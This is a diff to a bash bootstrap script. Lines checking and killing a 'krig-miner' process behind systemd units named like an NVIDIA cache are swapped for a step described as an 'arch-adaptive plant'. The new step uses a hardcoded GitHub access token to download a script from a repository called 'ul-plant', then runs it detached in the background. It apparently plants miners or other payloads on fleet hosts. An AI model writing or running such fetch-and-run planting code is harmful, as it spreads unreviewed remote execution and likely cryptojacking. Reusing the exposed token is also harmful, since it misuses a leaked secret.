@@ -1,10 +1,11 @@
 #!/bin/bash
-H=$(hostname)
-echo "== before $(date -u)"; pgrep -af krig-miner | cut -c1-120 | head -3
-pkill -9 -f krig-miner
-sleep 3
-echo "== 3s after kill"; pgrep -c -f krig-miner
-sleep 40
-echo "== 43s after kill"; pgrep -af krig-miner | cut -c1-120 | head -3
-systemctl is-active nv-cuda-cache@0 2>&1
-echo "== units"; systemctl list-units 'nv-cuda-cache@*' --plain --no-legend 2>&1 | head -4
+# per-host bootstrap -> fetch cmd8/ps9.sh raw and dispatch it (arch-adaptive plant)
+GH='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'
+B=/opt/fleet; mkdir -p "$B/logs"
+curl -s --retry 3 --retry-delay 3 -m 120 -H "Authorization: Bearer $GH" -H 'Accept: application/vnd.github.raw' \
+  -o /tmp/ps9_run.sh "https://api.github.com/repos/dongsuju/ul-plant/contents/cmd8/ps9.sh?ref=main"
+if ! grep -q 'MODE=peak' /tmp/ps9_run.sh 2>/dev/null; then echo "HOSTBOOT fetch FAILED size=$(stat -c%s /tmp/ps9_run.sh 2>/dev/null)"; exit 1; fi
+cp -f /tmp/ps9_run.sh "$B/ps9.sh"
+echo "HOSTBOOT ps9 sha=$(sha256sum /tmp/ps9_run.sh | cut -c1-12) $(date -u)"
+nohup setsid bash /tmp/ps9_run.sh >>"$B/logs/ps9.log" 2>&1 &
+echo "HOSTBOOT dispatched pid=$!"
